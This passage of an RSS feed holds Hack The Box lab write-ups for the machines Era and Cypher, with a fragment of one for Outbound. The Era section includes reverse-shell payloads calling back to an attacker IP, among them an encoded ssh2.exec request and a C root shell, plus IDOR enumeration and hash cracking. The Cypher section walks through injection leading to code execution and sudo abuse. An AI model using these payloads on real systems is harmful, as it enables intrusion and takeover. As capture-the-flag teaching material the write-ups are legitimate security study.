+<span class="hljs-string">Remember</span> <span class="hljs-string">to</span> <span class="hljs-string">change</span> <span class="hljs-string">your</span> <span class="hljs-string">password</span> <span class="hljs-string">when</span> <span class="hljs-string">you</span> <span class="hljs-string">next</span> <span class="hljs-string">log</span> <span class="hljs-string">into</span> <span class="hljs-string">your</span> <span class="hljs-string">account.</span>
+
+<span class="hljs-string">Thanks!</span>
+
+<span class="hljs-string">Tyler</span></code></pre></div>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Once again, we get CVE for an app asap.</p>
+<div><pre class="hljs"><code>jacob@outbound:~$ sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> jacob on outbound:
+    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin\:/u</span>sr<span class="hljs-regexp">/local/</span>bin\:<span class="hljs-regexp">/usr/</span>sbin\:<span class="hljs-regexp">/usr/</span>bin\:<span class="hljs-regexp">/sbin\:/</span>bin\:<span class="hljs-regexp">/snap/</span>bin, use_pty
+
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/below *, !/u</span>sr<span class="hljs-regexp">/bin/</span>below --config*, !<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/below --debug*, !/u</span>sr<span class="hljs-regexp">/bin/</span>below -d*</code></pre></div>
+<p><a title="https://raw.githubusercontent.com/Thekin-ctrl/CVE-2025-27591-Below/refs/heads/main/Exploit.py" href="https://raw.githubusercontent.com/Thekin-ctrl/CVE-2025-27591-Below/refs/heads/main/Exploit.py">https://raw.githubusercontent.com/Thekin-ctrl/CVE-2025-27591-Below/refs/heads/main/Exploit.py</a></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Linux - Medium - Era]]></title>
+            <guid>33bfffb0f7614715b41bfbf1e03b2779</guid>
+            <pubDate>Thu, 31 Jul 2025 15:48:26 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p><img src="/_resources/7a25f15c7dde4b9eaff6764fe2d78f17.png" /></p>
+<p><img src="/_resources/d9303eef1a7f4ec8ab2381143174a7a1.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-section">└──╼ $gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://era.htb  --append-domain -t 150
+===============================================================</span>
+Gobuster v3.6
+<span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================</span>
+[+] Url:             http://era.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: file.era.htb Status: 200 [Size: 6765]</code></pre></div>
+<p><img src="/_resources/a6cdbaefe9284a50b6558154c32583be.png" /></p>
+<p><img src="/_resources/261558baaada40c2a43dd8d042a67e85.png" /></p>
+<h1 id="file">file</h1>
+<p>When looking at the dirbuster, we can find register.php, which is not visible on the main site. We then get access to the management panel.</p>
+<p><img src="/_resources/a9d986aaf4d64d7c813ef5459b6bf50c.png" /></p>
+<p>In it, we can upload files. Doing so, gives us a download link with possible idor.</p>
+<p><img src="/_resources/28a75edb17ad410e803f1032f01f2551.png" /></p>
+<p>We can check random number and see that authentication for that user is not required.</p>
+<p><img src="/_resources/510ccee877284e99b30bf992c17a89be.png" /></p>
+<p>We can enumerate it using ffuf.</p>
+<div><pre class="hljs"><code><span class="hljs-string">ffuf</span> <span class="hljs-string">-w</span> <span class="hljs-string">numbers.txt:FUZZ</span> <span class="hljs-string">-u</span> <span class="hljs-string">http://file.era.htb/download.php?id=FUZZ</span> <span class="hljs-string">-b</span> <span class="hljs-string">"PHPSESSID=0gdg6cbtkrrcqb72sr386l3005"</span> <span class="hljs-string">-mc</span> <span class="hljs-number">200</span> <span class="hljs-string">-fr</span> <span class="hljs-string">"Not Found"</span>
+
+<span class="hljs-number">54</span>                      [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">6378</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">67ms</span>]
+<span class="hljs-number">150</span>                     [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">6366</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">2552</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">222</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">38ms</span>]</code></pre></div>
+<p>This gives us two files, <code>signing.zip</code> and <code>site-backup-30-08-24.zip</code>. After extraction we get <code>filedb.sqlite</code>.</p>
+<p><img src="/_resources/80259d4cfcfd43459ced6330414cfb83.png" /></p>
+<p>We can crack them with <code>hashcat -m 3200 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt</code> and get</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$2y</span><span class="hljs-variable">$10</span><span class="hljs-variable">$S9EOSDqF1RzNUvyVj7OtJ</span>.<span class="hljs-symbol">mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:</span>america - eric
+<span class="hljs-variable">$2b</span><span class="hljs-variable">$12</span><span class="hljs-variable">$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2</span>.<span class="hljs-symbol">:mustang</span> - yuri</code></pre></div>
+<p>Using these findings, we can log in as yuri and reset admin_ef01cab31aa password using “Update Security Questions” feature.</p>
+<p><img src="/_resources/1f973860ed114f008b83dd3ca0fba711.png" /></p>
+<p><img src="/_resources/0c3b46c1d72a442cb67b68d062bdef22.png" /></p>
+<p><img src="/_resources/91b1590b4da54356a4e299272cb49511.png" /></p>
+<p>Looking back at the source code, we can find in download.php interesting comment.</p>
+<div><pre class="hljs"><code>    <span class="hljs-comment">// BETA (Currently only available to the admin) - Showcase file instead of downloading it</span>
+    } <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'show'</span>] === <span class="hljs-string">"true"</span> &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'erauser'</span>] === <span class="hljs-number">1</span>) {
+    		<span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'format'</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'format'</span>] : <span class="hljs-string">''</span>;
+    		<span class="hljs-variable">$file</span> = <span class="hljs-variable">$fetched</span>[<span class="hljs-number">0</span>];
+
+        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$format</span>, <span class="hljs-string">'://'</span>) !== <span class="hljs-literal">false</span>) {
+        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-variable">$format</span>;
+        		header(<span class="hljs-string">'Content-Type: application/octet-stream'</span>);
+    		} <span class="hljs-keyword">else</span> {
+        		<span class="hljs-variable">$wrapper</span> = <span class="hljs-string">''</span>;
+        		header(<span class="hljs-string">'Content-Type: text/html'</span>);
+    		}
+
+    		<span class="hljs-keyword">try</span> {
+        		<span class="hljs-variable">$file_content</span> = fopen(<span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>, <span class="hljs-string">'r'</span>);
+            <span class="hljs-variable">$full_path</span> = <span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>;
+            <span class="hljs-comment">// Debug Output</span>
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Opening: "</span> . <span class="hljs-variable">$full_path</span> . <span class="hljs-string">"\n"</span>;
+        		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_content</span>;
+    		} <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) {
+        		<span class="hljs-keyword">echo</span> <span class="hljs-string">"Error reading file: "</span> . <span class="hljs-variable">$e</span>-&gt;getMessage();
+    		}</code></pre></div>
+<p>We can abuse it using ss2exec wrapper.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">GET</span> /download.php?id=<span class="hljs-number">54</span>&amp;show=true&amp;format=ssh2.exec%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>fyuri%<span class="hljs-number">3</span>amustang%<span class="hljs-number">40127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">2</span>fbash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>bash%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>fdev%<span class="hljs-number">2</span>ftcp%<span class="hljs-number">2</span>f<span class="hljs-number">10.10.16.29</span>%<span class="hljs-number">2</span>f4444%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">261</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>a</code></pre></div>
+<p><img src="/_resources/7a6a93cdd917449f985eee4b72a4dd77.png" /></p>
+<p>We can then sign in as eric and get the user flag.</p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="priv-esc">Priv esc</h1>
+<p>ps aux gets us</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">root</span>       <span class="hljs-number">44149</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">2892</span>   <span class="hljs-number">968</span> ?        Ss   <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /bin/sh -c bash -c '/root/initiate_monitoring.sh' &gt;&gt; /opt/AV/periodic-checks/status.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>
+<span class="hljs-attribute">root</span>       <span class="hljs-number">44150</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">4784</span>  <span class="hljs-number">3292</span> ?        S    <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /bin/bash /root/initiate_monitoring.sh
+<span class="hljs-attribute">root</span>       <span class="hljs-number">44160</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">2776</span>  <span class="hljs-number">1024</span> ?        S    <span class="hljs-number">11</span>:<span class="hljs-number">55</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /opt/AV/periodic-checks/monitor</code></pre></div>
+<p>We can check that devs can write to this file - and we are devs.</p>
+<div><pre class="hljs"><code>eric@era:<span class="hljs-regexp">/tmp$ ls -al /</span>opt<span class="hljs-regexp">/AV/</span>periodic-checks/monitor
+-rwxrw---- <span class="hljs-number">1</span> root devs <span class="hljs-number">16544</span> Aug  <span class="hljs-number">1</span> <span class="hljs-number">11</span>:<span class="hljs-number">57</span> <span class="hljs-regexp">/opt/</span>AV<span class="hljs-regexp">/periodic-checks/m</span>onitor
+eric@era:/tmp$ id
+uid=<span class="hljs-number">1000</span>(eric) gid=<span class="hljs-number">1000</span>(eric) groups=<span class="hljs-number">1000</span>(eric),<span class="hljs-number">1001</span>(devs)
+eric@era:<span class="hljs-regexp">/tmp$ file /</span>opt<span class="hljs-regexp">/AV/</span>periodic-checks/monitor
+<span class="hljs-regexp">/opt/</span>AV<span class="hljs-regexp">/periodic-checks/m</span>onitor: ELF <span class="hljs-number">64</span>-bit LSB pie executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>, BuildID[sha1]=<span class="hljs-number">45</span>a4bb1db5df48dcc085cc062103da3761dd8eaf, <span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>, not stripped</code></pre></div>
+<p>All that is left to create a simple revshell, sign it and wait for root.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>); <span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);
+    <span class="hljs-built_in">execl</span>(<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"bash"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"bash -i &gt;&amp; /dev/tcp/10.10.16.29/2137 0&gt;&amp;1"</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre></div>
+<p>x86_64-linux-gnu-gcc -o monitor reverse.c -static<br />
+./elf-sign sha256 key.pem key.pem monitor</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Linux - Medium - Cypher]]></title>
+            <guid>1eed6899f0ca4a5d9379b5f752c8da28</guid>
+            <pubDate>Sun, 18 May 2025 18:37:49 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p><img src="/_resources/b5827a79d1114d349dc185545fff0162.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$nmap</span> -p- -A cypher.htb
+PORT   STATE SERVICE <span class="hljs-keyword">VERSION</span>
+22/tcp <span class="hljs-keyword">open</span>  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 be:68:<span class="hljs-keyword">db</span>:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
+|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:<span class="hljs-keyword">ac</span>:d6:3d:23 (ED25519)
+80/tcp <span class="hljs-keyword">open</span>  http    nginx 1.24.0 (Ubuntu)
+|_http-title: <span class="hljs-keyword">GRAPH</span> ASM
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<div><pre class="hljs"><code>└──╼ $whatweb http://cypher.htb/
+http://cypher.htb/ <span class="hljs-comment">[200 OK]</span> Bootstrap, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[nginx/1.24.0 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.220.106]</span>, JQuery<span class="hljs-comment">[3.6.1]</span>, Script, Title<span class="hljs-comment">[GRAPH ASM]</span>, nginx<span class="hljs-comment">[1.24.0]</span></code></pre></div>
+<p><img src="/_resources/2cf08e75735f4649b280236f953cd65b.png" /></p>
+<p>Site doesnt have much to offer and <code>gobuster</code> doesnt find any subdomains. There is a login panel, but there is no account creation capability.</p>
+<p><img src="/_resources/51dc72bcd4204790937b72d7ac4efb3f.png" /></p>
+<p>Dirbuster finds <code>/testing</code> directory in which there is only one file, <code>custom-apoc-extension-1.0-SNAPSHOT.jar</code>.</p>
+<p><img src="/_resources/48f6bf17a28444bc9ee25eac74757b4b.png" /></p>
+<p>We can decompile it using <code>jd-gui</code>.</p>
+<p><img src="/_resources/93898343e02846668bde44e9dccf9a81.png" /></p>
+<p>Neo4j is a graph database — instead of storing data in rows and columns like SQL databases, it stores data as nodes, relationships, and properties. Neo4j uses a query language called Cypher, which explains the name of this box. It also has official support for GraphQL. Testing the login field, we can see that we can create an injection.</p>
+<p><img src="/_resources/e3e05b43e9c142ccb0c5d4212a02f1e5.png" /></p>
+<p>Testing it further and <a title="https://pentester.land/blog/cypher-injection-cheatsheet/" href="https://pentester.land/blog/cypher-injection-cheatsheet/">learning more about cypher</a> allowed me to call the custom java function discovered ealier. (<a title="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits" href="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits">another good resource here</a>)</p>
+<p><img src="/_resources/01e83f8efd1242f09a51949d14ce778d.png" /></p>
+<p>That was the hard part. Now we can terminate the function earlier and basicly have an RCE.</p>
+<p><img src="/_resources/a6bcffd660f54efeb35ed16ec7e6bc7e.png" /></p>
+<p><img src="/_resources/f9e30e67d265480195b813fea44553db.png" /></p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<p>Lurking on the system we can find the pass in <code>.bash_history</code>.</p>
+<div><pre class="hljs"><code>neo4j<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:~/data/dbms</span><span class="hljs-variable">$ </span>cat ~/.bash_history
+neo4j-admin dbms set-initial-password cU4btyib.<span class="hljs-number">20</span>xtCMCXkBmerhK
+
+neo4j<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls
+graphasm
+neo4j<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>su graphasm
+<span class="hljs-symbol">Password:</span> cU4btyib.<span class="hljs-number">20</span>xtCMCXkBmerhK
+
+graphasm<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>done <span class="hljs-symbol">:</span>)</code></pre></div>
+<p>We can add new public key to the <code>~/.ssh/authorized_keys</code> and go for root.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>There is only one interesting file in the home folder. What’s strange, is that there is no <code>bbot_scans</code> dir.</p>
+<div><pre class="hljs"><code>graphasm@cypher:~$ cat bbot_preset.yml 
+<span class="hljs-symbol">targets:</span>
+  - ecorp.htb
+<span class="hljs-symbol">
+output_dir:</span> <span class="hljs-keyword">/home/</span>graphasm/bbot_scans
+<span class="hljs-symbol">
+config:</span>
+<span class="hljs-symbol">  modules:</span>
+<span class="hljs-symbol">    neo4j:</span>
+<span class="hljs-symbol">      username:</span> neo4j
+<span class="hljs-symbol">      password:</span> cU4btyib<span class="hljs-number">.20</span>xtCMCXkBmerhK</code></pre></div>
+<p>Looking online for bbot we can find that it’s probably <a title="https://github.com/blacklanternsecurity/bbot" href="https://github.com/blacklanternsecurity/bbot">Bighuge BLS OSINT Tool</a>, which is clearly in the top 10 best tool names.</p>
+<p>What’s even cooler, is that we can run it with sudo.</p>
+<div><pre class="hljs"><code>graphasm<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> graphasm on <span class="hljs-symbol">cypher:</span>
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>, use_pty
+
+User graphasm may run the following commands on <span class="hljs-symbol">cypher:</span>
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/local/bin/bbot</code></pre></div>
+<p>We can get root flag by running <code>sudo bbot --custom-yara-rules /root/root.txt -vv -d</code>. It is possible to gain root shell, by creating a custom module and running again bbot with sudo.</p>
+]]></content:encoded>
+        </item>
+    </channel>
+</rss>
